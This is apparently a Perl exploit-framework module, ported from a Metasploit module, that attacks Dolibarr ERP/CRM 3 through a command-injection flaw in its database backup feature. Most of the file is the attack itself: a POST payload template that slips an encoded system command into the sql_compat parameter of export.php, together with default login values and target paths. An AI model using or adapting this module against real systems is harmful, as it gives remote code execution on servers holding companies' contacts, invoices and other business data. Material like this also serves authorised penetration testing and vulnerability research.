package DOLIBARR::MSF::DolibarrCmdExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "DolibarrCmdExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "DESCRIPTION" => "

          This module exploits a vulnerability found in Dolibarr ERP/CRM 3's

        backup feature.  This software is used to manage a company's business

        information such as contacts, invoices, orders, stocks, agenda, etc.

        When processing a database backup request, the export.php function

        does not check the input given to the sql_compat parameter, which allows

        a remote authenticated attacker to inject system commands into it,

        and then gain arbitrary code execution.

      ",
  "DOLIBARR USERTITLE" => "admin",
  "FILETITLE_TEMPLATE" => "mysqldump_dolibarrdebian_3.1.1_201203231716.sql",
  "METHOD" => "POST",
  "MSF_MODULE" => "dolibarr_cmd_exec",
  "OSVDB" => 80980,
  "PATH" => "__\\\@URI\\.PATH__index.php?",
  "PATHS" => ["__\\\@URI\\.PATH__index.php", "dolibarr/"],
  "PAYLOAD" => "token=__TOKEN__&loginfunction=loginfunction&tz=-6&dst=1&screenwidth=1093&screenheight=842&username=__USERNAME__&password=__PASSWORD__&token=__TOKEN__&export_type=server&what=mysql&mysqldump=/usr/bin/mysqldump&use_transaction=yes&disable_fk=yes&sql_compat=;__PAYLOAD\\.ENCODED__;&sql_structure=structure&drop=1&sql_data=data&showcolumns=yes&extended_ins=yes&delayed=yes&sql_ignore=yes&hexforbinary=yes&filename_template=mysqldump_dolibarrdebian_3.1.1_201203231716.sql&compression=none&",
  "REFERENCES" => ["http://seclists.org/fulldisclosure/2012/Apr/78"],
  VARIABLES => {
    'PASSWORD' =>       { DESCRIPTION => "Dolibarr Password", VALUE => "test" },
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       { DESCRIPTION => "The URI path to dolibarr", VALUE => "/dolibarr/" },
    'TOKEN' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
